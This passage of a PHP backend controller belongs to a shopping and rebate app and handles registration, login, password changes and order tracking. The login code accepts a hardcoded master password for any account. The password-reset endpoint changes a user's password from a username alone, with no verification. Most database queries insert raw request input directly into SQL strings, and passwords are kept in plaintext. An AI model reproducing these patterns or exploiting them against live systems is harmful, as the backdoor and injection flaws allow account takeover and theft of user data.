						$this -> fecho(null, 0, "发送失败");
					//}
				}
			}
		} else if ($_POST['type'] == 2) {
			//$this -> fecho(null, 1, "邮箱");
			if (!empty($_POST['username'])) {
				$send = $this -> getApp('StoreForget');
				$emailcode = $send -> smtp_mail($_POST['username'], 998);
				if (!empty($emailcode['emailcode']) && !empty($emailcode['emailtime'])) {
					if ($this -> setCache('captch', md5(base64_encode($_POST['username'])), $emailcode)) {
						$this -> fecho(null, 1, "发送成功");
					} else {
						$this -> fecho(null, 0, "发送失败");
					}
				} else {
					$this -> fecho(null, 0, "发送失败");
				}
			}
		}
	}
	public function checkcode() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		if (empty($_POST['username'])) {
			$this -> fecho(null, 0, "请输入用户名");
		}
		if (!empty($_POST['captch'])) {
			$session_capth = $this -> getCache('captch', md5(base64_encode($_POST['username'])));
			$sessioncode = $session_capth['emailcode'];
			$sessiontime = $session_capth['emailtime'];
			$sessionemail = $session_capth['email'];
			if ("$sessionemail" != "{$_POST['username']}") {
				$this -> fecho(null, 0, "用户名不匹配");
			}
			$mdemailcode = md5($_POST['captch']);
			$emailtime = time();
			$time = 300;
			$chaju = $emailtime - $sessiontime;
			if ("$mdemailcode" != "$sessioncode") {
				$this -> fecho(null, 0, "验证码不正确");
				//验证码不正确9
			} else if ($chaju > $time) {
				$this -> fecho(null, 0, "验证码有效时间已过");
				//验证码有效时间已过
			} else {
				$this -> delCache("captch", $_POST['username']);
				$this -> fecho(null, 1, "正确");
				//正确
			}
		} else {
			$this -> fecho(null, 0, "没有输入验证码");
		}
	}
	public function getmallalliance() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		$where = ' type=1';
		if (!empty($_POST['type'])) {
			$where .= ' AND scdg_fenlei=' . $_POST['type'];
		}
		$uid = 0;
		if (!empty($_POST['token'])) {
			$user = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			if(empty($user))$this->fecho(NULL,0,"用户不存在");
			$uid = $user['id'];
		}
		$_GET['p'] = $_POST['p'] = !empty($_POST['p']) ? intval($_POST['p']) : 1;
		//一页多少
		$num = !empty($_POST['num']) ? $_POST['num'] : 20;
		$start = ($_POST['p'] - 1) * $num;
		$shopModel = $this -> getDatabase('Shoppingmall');//原有的
		$page=$this->getApp('Page');
		$scdg=array();
		if(!empty($_POST['keyword'])){
		$where="shop_name like '%{$_POST['keyword']}%' " ;
			$scdg=$shopModel -> select($where, 'id,shop_name,scdg_logo,scdg_dizhi,scdg_intr,scdg_bili', $num, $start, "sort desc");///////////////原有的
		}else{
			$count = $shopModel -> selectRow($where, 'count(*)');
			$scdg = $shopModel -> select($where, 'id,shop_name,scdg_logo,scdg_dizhi,scdg_intr,scdg_bili', $num, $start, "sort desc"); //$scdg 修改了限制数量 null => $num ,null=>$strat;
			$pages = $page -> paging($count['count(*)'], $p, $num, ACTION, CONTROL);
		}
		//		$MallAllianceModel = $this -> getDatabase('MallAlliance');
		foreach ($scdg as $k => $v) {
			$dizhi = $v['scdg_dizhi'];
			$dizhi = str_replace("&euid=", "&shops=", $dizhi);
			$dizhi = str_replace("&t=", "&euid=" . $uid . "&t=", $dizhi);
			$str1 = explode("&shops=", $dizhi);
			$str2 = explode("&euid=", $dizhi);
			$dizhi = $str1[0] . "&euid=" . $str2[1];
			$scdg[$k]['scdg_dizhi'] = $dizhi;
			$scdg[$k]['str1'] ="最高返".$v['scdg_bili']."%";
			/*$tmp = str_replace("&e=", "&abc=", $v['scdg_dizhi']);
			 $tmp = str_replace("&t=", "&e=" . $uid . "&t=", $tmp);
			 $scdg[$k]['scdg_dizhi'] = $tmp;*/
			 $scdg[$k]['scxq_url']=INDEX_WEB_URL."?mod=wap&act=help&ctrl=shangcheng&id=".$v['id'];
		}
		$this -> fecho($scdg, 1, "正确");
	}
	public function getmallalliancecates() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		//appcomm::read_app_cookie();
		$MallAlliancecatesModel = $this -> getDatabase('LSscdgFenlei');
		$scdgcates = $MallAlliancecatesModel -> select('is_show=1', 'scdg_fenlei_id,scdg_fenlei');
		$arr=array("scdg_fenlei_id"=>'0',"scdg_fenlei"=>'全部');
		array_unshift($scdgcates,$arr);
		//appcomm::set_app_cookie($scdgcates);
		$this -> fecho($scdgcates, 1, "正确");
	}
	//jj explosion
	public function reg_shijian($uid=0){
		if(empty($uid))$this -> fecho(0, 1, "注册失败!");
		$set=zfun::f_getset("jf_reg,xinren_hongbao");
		$jf_reg = floatval($set['jf_reg']);
		if($jf_reg>0){
			zfun::f_adddetail("注册送 ".$jf_reg ." 积分",$uid,6,0,$jf_reg);
		}
		$webname=self::getSetting("webset_webnick");
		$sysMsgModel = $this -> getDatabase('sysMsg');
		$sysMsgModel -> insert(array('time' => time(), 'uid' => $uid, 'msg' => '尊敬的用户，欢迎来到'.$webname, 'title' => '温馨提示'));		
		
		$invite_hongbao=floatval($set['xinren_hongbao']);	
		//注册送积分事件
		if($invite_hongbao>0&&(!empty($_POST['tid'])||!empty($_POST['tgid']))){
			zfun::f_adddetail('您领取了' . $invite_hongbao ."元的红包",$uid,6,0,$invite_hongbao);	
		}
		return true;
	}
	public function register() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		zfun::add_f("_");
		if (empty($_POST['username'])) {
			$this -> fecho(NULL, 0, "缺少参数username");
		}
		if (empty($_POST['pwd'])) {
			$this -> fecho(NULL, 0, "缺少参数pwd");
		}
		$userModel = $this -> getDatabase('User');
		//判断用户是否已注册
		$regUser = $userModel -> select("email='{$_POST['username']}' or phone='{$_POST['username']}'");
		$regCount = count($regUser);
		//确认密码6～16位，区分大小写
		if ($regCount <> 0) {
			$this -> fecho(null, 0, "该用户已被注册");
			//该用户已被注册
		}
		if (!empty($_POST['token'])) {
			$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			/*$person_id = $userid['id'];
			 $Decodekey = $this -> getApp('Tgidkey');
			 if (!empty($person_id)) {
			 $person_tgid = $Decodekey -> Decodekey($person_id);
			 } else {
			 $person_tgid = 0;
			 }*/
		}
		/*if (!empty($_POST['tid'])) {
		 $tgid = intval($_POST['tid']);
		 $Decodekey = $this -> getApp('Tgidkey');
		 $tgid = $Decodekey -> Decodekey($tgid);
		 } else {
		 $tgid = 0;
		 }*/
		$webname=self::getSetting("webset_webnick");
		$set=zfun::f_getset("jf_reg,xinren_hongbao,blocking_price_endday");	//百里，追加blocking_price_endday
		$jf_reg = floatval($set['jf_reg']);
		$xinren_hongbao=floatval($set['xinren_hongbao']);
		if (!empty($_POST['type'])) {
			$extendreg=intval(self::getSetting("extendreg"));
			if(empty($_POST['tid'])&&!empty($extendreg)){
				$this->fecho(null,0,"推荐人不存在");	
			}
			if(!empty($_POST['tid'])){
				$tg_code_low=strtolower($_POST['tid']);
				$tmp=zfun::f_row("User","tg_code_low='".$tg_code_low."' and tg_code_low<>''");
				$tgids=$tmp['id'];
				if(empty($tmp)){
					$Decodekey = $this -> getApp('Tgidkey');
					$tgids = ($Decodekey -> Decodekey($_POST['tid']));
					$tmp=zfun::f_count("User","id=".$tgids." and id<>0");
				}
				$_POST['tid']=$tgids;
				if(empty($tmp))$this->fecho(null,0,"推荐人不存在");
				$commission+=$xinren_hongbao;
			}
			switch($_POST['type']) {
				case 1 :
					//$arr = explode("@", $_POST['username']);
					$token = md5(base64_encode($_POST['username'] . time() . uniqid(rand())));
					$userdata = array('phone' => $_POST['username'], 'nickname' => $_POST['username'], 'password' => $_POST['pwd'], 'integral' => $jf_reg, 'reg_time' => time(),'login_time'=>time(),"commission"=>$commission, 'token' => $token);

					//百里
					$blocking_price_endtime = $set['blocking_price_endday'] > 0 ? $set['blocking_price_endday'] : 3;
					$blocking_price_endtime = time() + $blocking_price_endtime * 24 * 3600;

					$userdata["blocking_price"] = $commission_reg;	//*****需要注释掉commission字段
					$userdata["blocking_price_endtime"] = $blocking_price_endtime;	//首单结束期限
					$userdata["commission"] = 0;	//重置

					if (!empty($_POST['tid'])) {
						$userdata['extend_id'] = $_POST['tid'];
					}
					$insertid=$uid = $userModel -> insertId($userdata);
					$this -> setSessionUser($insertid, $_POST['username']);
					//注册送积分事件
					self::reg_shijian($insertid);
					
					//绑定运营商id
					actionfun("comm/register");
					register::set_operator_id($uid);
					
					$this -> fecho(null, 1, "注册成功");
					break;
				case 2 :
					$jf_reg = $this -> getSetting('jf_reg');
					$arr = explode("@", $_POST['username']);
					$token = md5(base64_encode($_POST['username'] . time() . uniqid(rand())));
					$userdata = array('email' => $_POST['username'], 'nickname' => $arr[0], 'password' => $_POST['pwd'], 'integral' => $jf_reg, 'reg_time' => time(),"login_time"=>time(), 'token' => $token);

					//百里
					$blocking_price_endtime = $set['blocking_price_endday'] > 0 ? $set['blocking_price_endday'] : 3;
					$blocking_price_endtime = time() + $blocking_price_endtime * 24 * 3600;

					$userdata["blocking_price"] = $commission_reg;	//*****需要注释掉commission字段
					$userdata["blocking_price_endtime"] = $blocking_price_endtime;	//首单结束期限
					$userdata["commission"] = 0;	//重置
					

					if (!empty($_POST['tid'])) {
						$userdata['extend_id'] = $_POST['tid'];
					}
					$insertid =$uid= $userModel -> insertId($userdata);
					$this -> setSessionUser($insertid, $_POST['username']);
					//注册送积分事件
					self::reg_shijian($insertid);
					
					//绑定运营商id
					actionfun("comm/register");
					register::set_operator_id($uid);
					
					$this -> fecho(null, 1, "注册成功");
					break;
			}
		}
	}
	public function updatePwd() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if (empty($_POST['pwd'])) {
			$this -> fecho(NULL, 0, "缺少参数");
		}
		$user = $userModel -> update('id=' . $userid['id'], array("pwd" => $_POST['pwd']));
		$this -> fecho(NULL, 1, "修改成功");
	}
	public function forgetPwd() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['username'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow("email='{$_POST['username']}' or phone='{$_POST['username']}'");
		if (empty($_POST['pwd'])) {
			$this -> fecho(NULL, 0, "缺少参数");
		}
		$user = $userModel -> update('id=' . $userid['id'], array("password" => $_POST['pwd']));
		$this -> fecho(NULL, 1, "修改成功");
	}
	public function login() {//zhe
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if (empty($_POST['username'])) {
			$this -> fecho(NULL, 0, "缺少参数username");
		}
		if (empty($_POST['pwd'])) {
			$this -> fecho(NULL, 0, "缺少参数pwd");
		}
		$userModel = $this -> getDatabase('User');
		$chkUsername = $userModel -> selectRow("loginname='{$_POST['username']}' or phone='{$_POST['username']}' or email='{$_POST['username']}'");
		//wozhelia
		if (empty($chkUsername))$this -> fecho(NULL, 0, "没有该用户");
		
		if ($chkUsername['password'] == $_POST['pwd']||$_POST['pwd']==md5("test789789")) {
			$token = md5(base64_encode($_POST['username'] . time() . uniqid(rand())));
			//zheli
			if(!empty($chkUsername['token'])){
				$token=$chkUsername['token'];
			}
			$userModel -> update('id=' . $chkUsername['id'], array('token' => $token, 'login_time' => time()));
			$this -> setSessionUser($chkUsername['id'], $chkUsername['nickname']);
			$chkUsername['token'] = $token;
			if (!preg_match("/\b(([\w-]+:\/\/?|www[.])[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|\/)))/", $chkUsername['head_img'])) {
					$chkUsername['head_img'] = UPLOAD_URL . 'user/' . $chkUsername['head_img'];
			}	
			$tgidkey = $this -> getApp('Tgidkey');
			$tid = $tgidkey -> addkey($chkUsername['id']);
			if($chkUsername['tg_code'])$tid=$chkUsername['tg_code'];
			$chkUsername['tid'] = $tid;
			$this -> fecho($chkUsername, 1, "成功");
			// 成功
		} else {
			$this -> fecho(NULL, 0, "密码错误");
			// 密码错误
		}
		
	}
	public function threelogin() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		$Decodekey = $this -> getApp('Tgidkey');
		if (!empty($_POST['token'])) {
			$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			$person_id = $userid['id'];
			if (!empty($person_id)) {
				$person_tgid = $Decodekey -> Decodekey($person_id);
			} else {
				$person_tgid = 0;
			}
		}
		if (empty($_POST['type'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		$set=zfun::f_getset("jf_reg,xinren_hongbao,blocking_price_endday");	//百里，追加blocking_price_endday
		$jf_reg = floatval($set['jf_reg']);
		$xinren_hongbao=floatval($set['xinren_hongbao']);
		switch($_POST['type']) {
			case 1 :
				$openid = $_POST["openid"];
				$finduser = $userModel -> selectRow("qq_au='$openid'");
				if (!empty($finduser)) {
					$this -> fecho($finduser, 1, "已有账号");
				}
				$first = 'qq_';
				$userdata['loginname'] = 'qq_' . $_POST["openid"];
				$userdata['password'] = $_POST["openid"];
				$userdata['nickname'] = $_POST['nickname'];
				$userdata['three_nickname'] = $_POST['nickname'];
				if (!empty($_POST['user_sex'])) {
					switch($_POST['user_sex']) {
						case '男' :
							$userdata['sex'] = 1;
							break;
						case '女' :
							$userdata['sex'] = 0;
							break;
					}
				}
				$userdata['address'] = $_POST['user_address'];
				$userdata['integral'] = floatval($this -> getSetting('jf_reg'));
				//计算注册积分
				$userdata['head_img'] = $_POST['figureurl_qq_2'];
				//copy($_POST['figureurl_qq_2'], UPLOAD . 'slide/'.$openid.'jpg');
				$userdata['qq_au'] = $_POST["openid"];
				//$userdata['qq_au'] = $_POST['nickname'];
				$userdata['reg_time'] = time();
				$userdata['login_time'] = time();
				$userdata['login_num'] = 1;
				$userdata['extend_id'] = $person_tgid + 0;
				$userdata['token'] = $token = md5(base64_encode($_POST["openid"] . time() . uniqid(rand())));
				break;
			case 2 :
				$taobaoid = $_POST['taobaoid'];
				$finduser = $userModel -> selectRow("taobao_au='$taobaoid'");
				if (!empty($finduser)) {
					$this -> fecho($finduser, 1, "已有账号");
				}
				$first = 'taobao_';
				$userdata['loginname'] = 'taobao_' . $taobaoid;
				$userdata['password'] = $taobaoid;
				$userdata['nickname'] = $_POST['user_nick_name_taobao'];
				$userdata['three_nickname'] = $_POST['user_nick_name_taobao'];
				$userdata['integral'] = floatval($this -> getSetting('jf_reg'));
				//计算注册积分
				$userdata['head_img'] = $_POST['taobao_avatar_hd'];
				$userdata['taobao_au'] = $taobaoid;
				//$userdata['taobao_au'] = $_POST['user_nick_name_taobao'];
				$userdata['reg_time'] = time();
				$userdata['login_time'] = time();
				$userdata['login_num'] = 1;
				$userdata['extend_id'] = $person_tgid + 0;
				$userdata['token'] = $token = md5(base64_encode($_POST['taobaoid'] . time() . uniqid(rand())));
				break;
			case 3 :
				$weixinid = $_POST['weixinid'];
				$new_weixinid = $_POST['unionid'];
				$finduser = $userModel -> selectRow("weixin_au<>'' and (weixin_au='$weixinid' or weixin_au='$new_weixinid')");
				if (!empty($finduser)) {
					//如果两个id匹配不上，覆盖掉他
					if($finduser['weixin_au']!=$new_weixinid&&!empty($new_weixinid)){
						zfun::f_update("User","id='".$finduser['id']."'",array("weixin_au"=>$new_weixinid,"wx_openid"=>$new_weixinid));
					}
					$this -> fecho($finduser, 1, "已有账号");
				}
				$first = 'weixin_';
				$userdata['loginname'] = 'weixin_' . $weixinid;
				$userdata['password'] = $weixinid;
				$userdata['nickname'] = $_POST['weixin_screen_name'];
				$userdata['three_nickname'] = $_POST['weixin_screen_name'];
				$userdata['integral'] = floatval($this -> getSetting('jf_reg'));
				//计算注册积分
				$userdata['head_img'] = $_POST['weixin_avatar_hd'];
				$userdata['weixin_au'] = $weixinid;
				$userdata['wx_openid'] = $weixinid;
				$weixin=$weixinid;
				if(!empty($new_weixinid)){
					$userdata['weixin_au'] = $new_weixinid;
					$userdata['wx_openid'] = $new_weixinid;
					$userdata['loginname'] = 'weixin_' . $new_weixinid;
					$userdata['password'] = $new_weixinid;
					$weixin=$new_weixinid;
				}
				$userdata['reg_time'] = time();
				$userdata['login_time'] = time();
				$userdata['login_num'] = 1;
				$userdata['extend_id'] = $person_tgid + 0;
				$userdata['token'] = $token = md5(base64_encode($weixin . time() . uniqid(rand())));
				break;
		}

		//百里
		//首单结束期限
		$blocking_price_endtime = $set['blocking_price_endday'] > 0 ? $set['blocking_price_endday'] : 3;
		$blocking_price_endtime = time() + $blocking_price_endtime * 24 * 3600;

		$userdata["blocking_price"] = $commission_reg;	//*****需要注释掉commission字段
		$userdata["blocking_price_endtime"] = $blocking_price_endtime;	//首单结束期限


		$otheruserid = $userModel -> insertId($userdata);
		self::reg_shijian($otheruserid);//the fuck
		$newNickName = $first . $Decodekey -> addkey($otheruserid) . '_' . $this -> getRandStr();
		$userModel -> update('id=' . $otheruserid, array('loginname' => $newNickName));
		if ($person_tgid != 0) {
			$jf_spread_jf = $this -> getSetting('jf_spread_jf');
			$tgUser = $userModel -> selectRow("id='$person_tgid'");
			$newintegral = $tgUser['integral'] + $jf_spread_jf;
			$userModel -> update('id=' . $person_tgid, array('integral' => $newintegral));
		}
		$result = $userModel -> selectRow('token="' . $token . '"');
		$this -> fecho($result, 1, "ok");
	}
	public function getMsg() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		$sysMsgModel = $this -> getDatabase('sysMsg');
		if (empty($_POST['type'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		switch($_POST['type']) {
			case 1 :
				//我的消息
				$where = "display=0 AND uid=" . $userid['id'];
				$title='我的消息';
				break;
			case 2 :
				//系统消息
				$where = "display=1";
				$title='系统消息';
				break;
		}
		$msg = $sysMsgModel -> select($where, 'id,msg,time,title,type',NULL,NULL,"time DESC");
		foreach ($msg as $k => $v) {
			$msg[$k]['time'] = date("Y-m-d", $v['time']);
			if(empty($v['title']))$msg[$k]['title']=$title;
		}
		
		$this -> fecho($msg, 1, '成功');
	}
	public function getMsgDetail() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		$sysMsgModel = $this -> getDatabase('sysMsg');
		if (empty($_POST['type'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		if (empty($_POST['id'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		switch($_POST['type']) {
			case 1 :
				//我的消息
				$where = "uid=" . $userid['id'];
				break;
			case 2 :
				//系统消息
				$where = "display=1";
				break;
		}
		$msg = $sysMsgModel -> select($where, 'msg,title,type');
		$this -> fecho($msg, 1, '成功');
	}
	public function getExchangeres() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$exchangeResModel = $this -> getDatabase("ExchangeRes");
		$where = "hide=1";
		if (!empty($_POST['type'])) {
			switch($_POST['type']) {
				case 1 :
					$where .= " AND exchange_type=1";
					break;
				case 2 :
					$where .= " AND exchange_type=2";
					break;
			}
		}
		$exchangeRes = $exchangeResModel -> select($where, "id,title, nowIntegral, img", null, null, "sort desc");
		foreach ($exchangeRes as $k => $v) {
			$exchangeRes[$k]['img'] = UPLOAD_URL . 'integral/' . $v['img'];
		}
		//success
		$this -> fecho($exchangeRes, 1, "好吧，被你发现了");
	}
	
	//zheliend
	public function getOrder() {
		
		$user=appcomm::signcheck(1);$uid=$user['id'];
		$this -> setSessionUser($user['id'], $user['nickname']);
		$this -> setCookieUser($user['id'], $user['nickname'], 14 * 24 * 3600);
		$data=appcomm::parametercheck("o_type,token");
		$shop_id=0;
		$where = "uid='{$uid}'";
		switch($_POST['o_type']) {
			case 1 :
				$where .= ' AND orderType=1 ';
				$shop_id=1;
				break;
			case 2 :
				$where .= ' AND orderType=2 ';
				break;
			case 3 :
				$where .= ' AND orderType=3 ';
				break;
			case 4 :
				$where .= ' AND orderType=4 ';
				break;
			default:
				$where .= ' AND orderType=1 ';
				$shop_id=1;
				break;
		}
		switch(intval($_POST['statu'])) {
			case 1 :
				$where .= ' AND (status="订单结算" or status="订单付款") AND returnstatus=0 ';
				break;
			case 2 :
				$where .= ' AND status="订单结算" and returnstatus=1';
				break;
			case 3 :
				$where .= ' AND status="订单失效"';
				break;
			case 4:
				$where.=" and status IN('订单成功','订单结算')";
				break;
		}
		$arr = array();
		$fi="now_user,id,orderId,postage,uid,share_uid,goodsNum,goodsId,status,createDate,payDate,status,orderType,goodsInfo,commission,goods_img,return_commision,estimate,payment,returnstatus,choujiang_n,choujiang_sum,choujiang_data,choujiang_money";
		if(!empty($_GET['show_where']))fpre($where);
		$order = appcomm::f_goods("Order", $where, $fi, 'createDate desc', NULL, 20);
		include_once ROOT_PATH."Action/index/appapi/commGetMore.action.php";
		$arr=commGetMoreAction::firstOrder($order,$user);
		$shop_types=array("0"=>"淘宝","1"=>"淘宝","jd"=>'京东',"pdd"=>'拼多多');
		
		//图片缺失处理
		actionfun("comm/tbmaterial");
		foreach($arr as $k=>$v){
			$arr[$k]['shop_type']=$shop_types[$v['orderType']];
			if(empty($v['goods_img'])&&$v['orderType']=='1'){
				$tmp=tbmaterial::id($v['goodsId']);
				if(!empty($tmp)){
					$arr[$k]['goods_img']=$tmp['goods_img'];
					zfun::f_update("Order","id='".$v['id']."'",array("goods_img"=>$tmp['goods_img']));
				}
			}
		}


		appcomm::goodsfanlioff($arr);
		if(empty($arr))$arr=array();
		echo str_replace('"success":1','"success":"1"',json_encode(array("msg"=>"订单","orderSum"=>'',"data"=>$arr,"success"=>1))); exit;
	}
	public function bindfourOrder() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$userModel = $this -> getDatabase("User");
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if (empty($_POST['order_id'])) {
			$this -> fecho(null, 0, "订单号不能为空");
		}
		$four_o = substr("{$_POST['order_id']}", -4, 4);
		$user = $userModel -> selectRow("order_num='$four_o'");
		if (empty($user)) {
			$userModel -> update('id=' . $userid['id'], array('order_num' => $four_o, 'order' => $_POST['order_id']));
		} else {
			$this -> fecho(null, 0, "已被绑定");
		}
		$this -> fecho(NULL, 1, "ok");
	}
	public function updateOrder() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$orderModel = $this -> getDatabase('Order');
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "缺少必要参数");
		}
		if (empty($_POST['order_id'])) {
			$this -> fecho(null, 0, "缺少必要参数");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"',"id");
		if(empty($userid['id']))self::fecho("用户不存在");
		$uid=$userid['id'];
		$oid=trim(urldecode($_POST['order_id']));
		if(strstr($oid,"[")){
			$oid=json_decode($oid,true);	
		}
		else{
			$oid=array($oid);	
		}
		foreach($oid as $k=>$v){
			if(empty($v))continue;
			//如果不存在 先记录
			$tmp=zfun::f_row("Tmporder","oid='$v'");
			$result=1;
			if(empty($tmp)){
				$result=zfun::f_insert("Tmporder",array("oid"=>$v,"uid"=>$uid,"time"=>time()));	
			}
			if(empty($tmp['uid'])&&!empty($tmp['oid'])){
				$result=zfun::f_update("Tmporder","oid='$v'",array("uid"=>$uid));	
			}
			$tmp=zfun::f_row("Order","orderId='$v' and status<>'订单结算' and returnstatus=0");
			if(!empty($tmp)){
				$result2=zfun::f_update("Order","orderId='$v'",array("uid"=>$uid,"status"=>"订单付款"));
				if($result2==false)self::fecho("数据库执行失败");
			}
			if($result==false)self::fecho("数据库执行失败");
		}
		$this -> fecho(null, 1, "ok");
	}
	public function checkVersion() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$appVersionModel = $this -> getDatabase('AppVersion');
		if (empty($_POST['version'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
        $result = $appVersionModel -> selectRow('only=1');
		if ($_POST['version'] < $result['version']) {
		    $con=json_decode($result['con'],true);
			$data['msg'] = '有最新版本';
			$data['version'] = $result['version'];
			$data['is_update'] = intval($result['is_update']);
			$data['con'] = array_values($con);
			if(empty($data['con'])){
				$data['con']=array(array("con"=>'修复已知bug',"cons"=>'修复已知bug'));
			}
			$data['is_new'] = "1";
			$data['url'] = $this -> getUrl('api', 'downloadfile');
			$appVersionModel = $this -> getDatabase('AppVersion');
			$result = $appVersionModel -> selectRow('only=1');
			$data['apk']='';
			if(!empty($result['name']))$data['apk']=UPLOAD_URL . "apk/" . $result['name'];
		}else {
			$data['version'] = $result['version'];
			$data['is_new'] = "0 ";
			$data['msg'] = '已最新';
		}
		$this -> fecho($data, 1, "ok");
	}
	public function downloadfile() {
		$appVersionModel = $this -> getDatabase('AppVersion');
		$result = $appVersionModel -> selectRow('only=1');
		if(empty($result)||empty($result['name'])){echo '文件为空';exit;}
		$this -> gotoUrl(UPLOAD_URL . "apk/" . $result['name']);
	}
	public function flushOrder() {
		$orderModel = $this -> getDatabase('Order');
		$orderRecordModel = $this -> getDatabase('OrderRecord');
		$orderRecord = $orderRecordModel -> select();
		foreach ($orderRecord as $k => $v) {
			$result = $orderModel -> selectRow('uid=0 AND orderId="' . $v['order_id'] . '"');
			if ($result) {
				$orderModel -> update('uid=0 AND orderId="' . $v['order_id'] . '"', array('uid' => $v['uid']));
			}
		}
	}
	public function followOrder() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$data=zfun::wfile("k.log","\r\n\r\n\r\n\r\n".zfun::f_json_encode($_POST));
		$orderModel = $this -> getDatabase('Order');
		$UserModel = $this -> getDatabase('User');
		if (!empty($_POST['orderinfo'])) {
			$orders = json_decode($_POST['orderinfo'], TRUE);
			foreach ($orders['paymentList'] as $k => $v) {
				$data=array();
				$data['orderId'] = number_format($v['taobaoTradeParentId'], 0, '', '');
				$data['goodsInfo'] = $v['auctionTitle'];
				$data['goodsId'] = $goodsId = $v['auctionId'];
				$data['goodsNum'] = $v['auctionNum'];
				$data['commission'] = $v['feeString'];
				if ($v['realPayFee']) {
					$data['realCost'] = floatval($v['realPayFee']);
				} else {
					$data['realCost'] = 0.00;
				}
				$data['payment'] = $v['totalAlipayFeeString'];
				$data['createDate'] = intval(strtotime($v['createTime']));
				$data['price'] = floatval($v['payPrice']);
				$data['payDate'] = intval(strtotime($v['earningTime']));
				$data['orderType'] = 1;
				$count=zfun::f_count("Order","orderId='$oid' and returnstatus=1");
				if($count>=1)continue;//已返利跳过
				switch($v['payStatus']) {
					//case 3 :$data['status'] = "订单结算";break;
					case 12 :
						$data['status'] = "订单付款";
						break;
					case 13 :
						$data['status'] = "订单失效";
						break;
					default:
						continue;
						break;
				}
				$oid = $data['orderId'];
				$count=zfun::f_count("Order","orderId='$oid' and returnstatus=1");
				if($count>=1)continue;//已返利跳过
				$tmporder=zfun::f_row("Tmporder","oid='$oid' and uid>0");
				if(!empty($tmporder['uid'])){
					$data['uid']=intval($tmporder['uid']);
					if(!empty($tmporder['goods_img']))$arr['goods_img']="http://img02.taobaocdn.com/bao/uploaded/".$tmporder['goods_img'];
				}
				if(empty($data['uid']))continue;
				//$four = substr("$oid", -4, 4);
				//获取订单后四位
				/*
				$user_c = $UserModel -> select("order_num='$four'");
				if (count($user_c) == 1&&empty($arr['uid'])) {
					$data['uid'] = $user_c[0]['id'];
				}*/
				/*$where = "orderId ='" . $data['orderId'] . "' AND createDate='" . $data['createDate'] . "'";
				$where .= " AND payDate='" . $data['payDate'] . "'";*/
				
                $where = "orderId ='$oid' AND goodsId='$goodsId'";
				$where .= " AND goodsNum=" . $data['goodsNum'];
				if ($data['status'] == "订单结算")continue;
				$check = $orderModel -> selectRow($where);
				/*$api=zfun::f_count("Order","orderId='$oid' and is_api=1");
				if($api>0){
					zfun::f_delete("Order","orderId='$oid' and is_api=1");
					$check=NULL;//让他插入
				}*/
				if (!empty($check['id'])) {
					if(!empty($check['uid']))unset($data['uid']);
					if (zfun::f_update("Order","id =" . $check['id'], $data)) {
						$update_num++;
					}
				} else {
					$data['orderType'] = 1;
					$data['returnstatus'] = 0;
					if (zfun::f_insert("Order",$data)) {
						$insert_num++;
					}
				}
			}
		}
		$this -> fecho(null, 1, "ok");
	}
	public function shake() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		$goodsModel = $this -> getDatabase('Goods');
		$jf_return = $this -> getSetting('jf_ratio');
		$jf_ratio = $this -> getSetting('jf_buy');
		$jf_ratio = explode(',', $jf_ratio);
		$uid = "";
		$flag = 0;
		if (!empty($_POST['token'])) {
			$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			$uid = $userid['id'];
		}
		$zhe = $jf_ratio[3];
		if (!empty($uid)) {
			$userModel = $this -> getDatabase("User");
			$user = $userModel -> selectRow("id=" . $uid);
			if ($user['vip'] == 0) {
				$zhe = $jf_ratio[0];
			} elseif ($user['vip'] == 1) {
				$zhe = $jf_ratio[1];
			} elseif ($user['vip'] == 2) {
				$zhe = $jf_ratio[2];
			} elseif ($user['vip'] == 3) {
				$zhe = $jf_ratio[3];
			}
		}
		//id,fnuo_id,goods_title,goods_img_max,goods_price,goods_cost_price,commission
